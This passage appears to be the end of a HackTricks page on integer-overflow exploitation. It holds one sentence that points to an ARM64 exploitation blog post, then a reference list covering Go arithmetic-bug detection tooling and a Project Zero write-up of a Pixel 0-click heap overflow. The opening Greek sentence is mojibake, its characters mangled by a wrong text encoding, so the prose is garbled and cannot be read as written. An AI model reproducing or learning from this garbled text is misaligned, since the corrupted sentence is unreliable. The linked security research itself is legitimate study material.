Î‘Ï…Ï„ÏŒ **Î´ÎµÎ½ Î±Î»Î»Î¬Î¶ÎµÎ¹ ÏƒÎµ ARM64** ÏŒÏ€Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ [**this blog post**](https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/).

## References

- [Detect Goâ€™s silent arithmetic bugs with go-panikint](https://blog.trailofbits.com/2025/12/31/detect-gos-silent-arithmetic-bugs-with-go-panikint/)
- [go-panikint (compiler fork)](https://github.com/trailofbits/go-panikint)
- [Pixel 0-click â€“ CVE-2025-54957 allocator wrap â†’ heap overflow](https://projectzero.google/2026/01/pixel-0-click-part-1.html)

{{#include ../banners/hacktricks-training.md}}
